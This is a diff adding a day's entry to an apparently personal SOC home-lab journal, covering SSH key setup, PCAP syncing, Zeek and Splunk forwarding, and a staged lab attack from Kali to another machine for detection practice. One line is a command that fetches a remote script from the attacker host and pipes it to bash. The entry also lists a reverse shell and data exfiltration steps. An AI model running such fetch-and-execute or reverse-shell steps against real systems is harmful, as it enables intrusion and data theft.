@@ -2260,6 +2260,8 @@ Key steps:
 - New ThinkPad host fully installed, optimized, and integrated.
 - Ready for reconnection with Proxmox, Kali, Pi, Splunk Enterprise, and PC2.
 - System running fast, cool, and smooth → perfect for SOC workflows.
+
+
 ## Day 37 — Rebuilding Lab Connectivity & New Splunk Forwarder
 Date:November 26, 2025 
 
@@ -2465,3 +2467,92 @@ Zeek logs will be added tomorrow after TA installation.
 <img width="5760" height="1080" alt="Screenshot from 2025-11-27 14-11-12" src="https://github.com/user-attachments/assets/21c5faa9-556c-4955-9735-ada689c4208b" />
 <img width="5760" height="1080" alt="Screenshot from 2025-11-27 14-48-12" src="https://github.com/user-attachments/assets/58325e45-1bca-44b2-890d-d48d2785d98b" />
 <img width="5760" height="1080" alt="Screenshot from 2025-11-27 14-50-00" src="https://github.com/user-attachments/assets/b86bc7fc-5d1f-428f-bdcc-5741ed4bf1f3" />
+
+
+## Day 39 — SSH automation, running a full malicious attack chain, capturing all network evidence
+Date:November 28, 2025
+
+## 🔐 1. SSH Trust & Key Configuration Fixed
+
+- Resolved the remote host identification error.
+- Cleaned old fingerprints from ~/.ssh/known_hosts.
+- Configured passwordless SSH using ED25519 keys.
+- Verified that both SSH and SCP now work without password prompts.
+- Automation scripts depending on SSH now work smoothly.
+
+
+## 📡 2. Automatic PCAP Sync Working Perfectly
+
+The script sync_latest_capture.sh now:
+
+- Detects the newest .pcap file.
+- Transfers it automatically to the host.
+- Uses SSH key auth → no password required.
+- Writes transfer logs correctly.
+
+
+## ⚔️ 3. Full HTTP-Based Malware Attack Chain (Kali → PC2)
+
+A complete multi-stage attack was executed:
+
+1. Hosted malicious files (`helper1.sh`, `payload1.sh`) on Kali.
+2. PC2 executed:
+     curl http://192.168.1.125/helper1.sh | bash
+   3. Helper script downloaded & ran payload.
+4. Reverse shell opened on port 4444.
+5. Fake secret data was created.
+6. Exfiltration performed via port 9001.
+
+
+## 🌐 4. PCAP and Zeek Logs Confirmed
+
+Captured:
+
+- HTTP requests
+- Reverse shell traffic
+- Exfiltration packets
+
+Zeek logs forwarded:
+
+- conn.log
+- http.log
+- dns.log
+
+
+## ⚠️ 5. TA-Zeek Installed but Field Extraction Not Working
+
+- Add-on installed.
+- Forwarder sending zeek logs.
+- Problem: Splunk shows TSV, no field extraction.
+
+
+## 📘 6. Theory Study — THM SOC Level 1 (1.5 hours)
+
+Covered SOC fundamentals, alerts, network logs, etc.
+
+
+# ✅ Final Summary
+
+✔ SSH automation fixed  
+✔ Auto PCAP sync fully operational  
+✔ Full malware → reverse shell attack completed  
+✔ PCAP + Zeek captured  
+✔ Forwarder works  
+❗ TA-Zeek normalization missing  
+✔ THM study done
+
+<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-49-52" src="https://github.com/user-attachments/assets/222bd37c-fdd5-4cc2-b8fd-25a811a0a337" />
+<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-48-56" src="https://github.com/user-attachments/assets/a67a8460-51c9-4f05-985c-63b72c080fc7" />
+<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-48-30" src="https://github.com/user-attachments/assets/ead32fb8-70dd-4a6e-845f-e54baef3dd00" />
+<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-46-18" src="https://github.com/user-attachments/assets/ea7b5587-38a3-4c70-bdec-1c209c0f2069" />
+<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-37-09" src="https://github.com/user-attachments/assets/06284575-5987-4854-87ab-284811996c97" />
+<img width="5760" height="1080" alt="splunkwireshark" src="https://github.com/user-attachments/assets/d28e975f-f59e-4e04-86de-7c7295e16bf1" />
+<img width="5760" height="1080" alt="splunk" src="https://github.com/user-attachments/assets/4502a1c4-2f4f-457e-be15-93268465ea2a" />
+<img width="5760" height="1080" alt="Screenshot from 2025-11-28 12-54-46" src="https://github.com/user-attachments/assets/98ad0b83-29c6-4315-ae1a-db526f3094d5" />
+
+
+
+
+
+
+
